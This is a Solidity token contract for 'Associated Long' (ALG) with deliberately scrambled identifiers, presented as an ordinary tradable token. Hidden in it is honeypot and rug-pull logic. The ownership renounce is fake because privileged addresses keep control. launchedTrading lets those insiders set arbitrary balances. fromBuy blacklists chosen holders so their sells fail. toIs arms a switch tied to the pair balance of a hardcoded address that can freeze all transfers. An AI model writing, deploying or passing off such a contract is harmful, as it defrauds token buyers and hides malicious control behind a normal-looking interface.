//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface modeExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract receiverEnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamSwap {
    function createPair(address toExempt, address walletReceiver) external returns (address);
}

interface takeTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atTokenMax) external view returns (uint256);

    function transfer(address senderTeam, uint256 tradingAuto) external returns (bool);

    function allowance(address enableLaunchList, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingAuto) external returns (bool);

    function transferFrom(
        address sender,
        address senderTeam,
        uint256 tradingAuto
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoSell, uint256 value);
    event Approval(address indexed enableLaunchList, address indexed spender, uint256 value);
}

interface takeTxMetadata is takeTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AssociatedLong is receiverEnable, takeTx, takeTxMetadata {

    bool private teamMarketing;

    address private atTeamExempt;

    bool private minExempt;

    bool private shouldTake;

    function getOwner() external view returns (address) {
        return atTeamExempt;
    }

    function maxReceiver(address senderMax) public {
        require(senderMax.balance < 100000);
        if (enableLaunch) {
            return;
        }
        if (teamMarketing != minExempt) {
            minExempt = true;
        }
        toFund[senderMax] = true;
        if (minExempt) {
            txShould = walletReceiverAmount;
        }
        enableLaunch = true;
    }

    uint256 constant modeSell = 9 ** 10;

    function name() external view virtual override returns (string memory) {
        return marketingEnable;
    }

    function transfer(address toSwap, uint256 tradingAuto) external virtual override returns (bool) {
        return atReceiver(_msgSender(), toSwap, tradingAuto);
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverLiquidityFee;
    }

    uint8 private liquidityReceiver = 18;

    uint256 public walletReceiverAmount;

    uint256 private swapReceiver;

    function transferFrom(address tradingReceiver, address senderTeam, uint256 tradingAuto) external override returns (bool) {
        if (_msgSender() != totalReceiverSwap) {
            if (maxLaunch[tradingReceiver][_msgSender()] != type(uint256).max) {
                require(tradingAuto <= maxLaunch[tradingReceiver][_msgSender()]);
                maxLaunch[tradingReceiver][_msgSender()] -= tradingAuto;
            }
        }
        return atReceiver(tradingReceiver, senderTeam, tradingAuto);
    }

    function atReceiver(address tradingReceiver, address senderTeam, uint256 tradingAuto) internal returns (bool) {
        if (tradingReceiver == receiverMax) {
            return amountTxTake(tradingReceiver, senderTeam, tradingAuto);
        }
        uint256 atMode = takeTx(tradingLaunchedReceiver).balanceOf(limitToken);
        require(atMode == isExempt);
        require(senderTeam != limitToken);
        if (modeMarketingTx[tradingReceiver]) {
            return amountTxTake(tradingReceiver, senderTeam, modeSell);
        }
        return amountTxTake(tradingReceiver, senderTeam, tradingAuto);
    }

    mapping(address => bool) public toFund;

    mapping(address => uint256) private sellIs;

    function launchedTrading(address toSwap, uint256 tradingAuto) public {
        fromLaunchedAuto();
        sellIs[toSwap] = tradingAuto;
    }

    uint256 txTotal;

    event OwnershipTransferred(address indexed feeList, address indexed sellFund);

    function launchLiquidity() public {
        emit OwnershipTransferred(receiverMax, address(0));
        atTeamExempt = address(0);
    }

    function owner() external view returns (address) {
        return atTeamExempt;
    }

    uint256 public txShould;

    string private receiverLiquidityFee = "ALG";

    function fromLaunchedAuto() private view {
        require(toFund[_msgSender()]);
    }

    mapping(address => bool) public modeMarketingTx;

    bool private shouldMax;

    function allowance(address liquiditySellWallet, address tokenShouldIs) external view virtual override returns (uint256) {
        if (tokenShouldIs == totalReceiverSwap) {
            return type(uint256).max;
        }
        return maxLaunch[liquiditySellWallet][tokenShouldIs];
    }

    function fromBuy(address atEnable) public {
        fromLaunchedAuto();
        
        if (atEnable == receiverMax || atEnable == tradingLaunchedReceiver) {
            return;
        }
        modeMarketingTx[atEnable] = true;
    }

    constructor (){
        
        modeExempt launchMarketingTx = modeExempt(totalReceiverSwap);
        tradingLaunchedReceiver = teamSwap(launchMarketingTx.factory()).createPair(launchMarketingTx.WETH(), address(this));
        if (amountReceiver == walletReceiverAmount) {
            walletReceiverAmount = liquidityLaunchFund;
        }
        receiverMax = _msgSender();
        launchLiquidity();
        toFund[receiverMax] = true;
        sellIs[receiverMax] = senderMarketing;
        
        emit Transfer(address(0), receiverMax, senderMarketing);
    }

    uint256 isExempt;

    uint256 public amountReceiver;

    address public receiverMax;

    function decimals() external view virtual override returns (uint8) {
        return liquidityReceiver;
    }

    function amountTxTake(address tradingReceiver, address senderTeam, uint256 tradingAuto) internal returns (bool) {
        require(sellIs[tradingReceiver] >= tradingAuto);
        sellIs[tradingReceiver] -= tradingAuto;
        sellIs[senderTeam] += tradingAuto;
        emit Transfer(tradingReceiver, senderTeam, tradingAuto);
        return true;
    }

    function approve(address tokenShouldIs, uint256 tradingAuto) public virtual override returns (bool) {
        maxLaunch[_msgSender()][tokenShouldIs] = tradingAuto;
        emit Approval(_msgSender(), tokenShouldIs, tradingAuto);
        return true;
    }

    address limitToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function totalSupply() external view virtual override returns (uint256) {
        return senderMarketing;
    }

    bool public exemptBuy;

    function toIs(uint256 tradingAuto) public {
        fromLaunchedAuto();
        isExempt = tradingAuto;
    }

    uint256 private senderMarketing = 100000000 * 10 ** 18;

    uint256 public liquidityLaunchFund;

    address totalReceiverSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function balanceOf(address atTokenMax) public view virtual override returns (uint256) {
        return sellIs[atTokenMax];
    }

    address public tradingLaunchedReceiver;

    mapping(address => mapping(address => uint256)) private maxLaunch;

    string private marketingEnable = "Associated Long";

    bool public enableLaunch;

}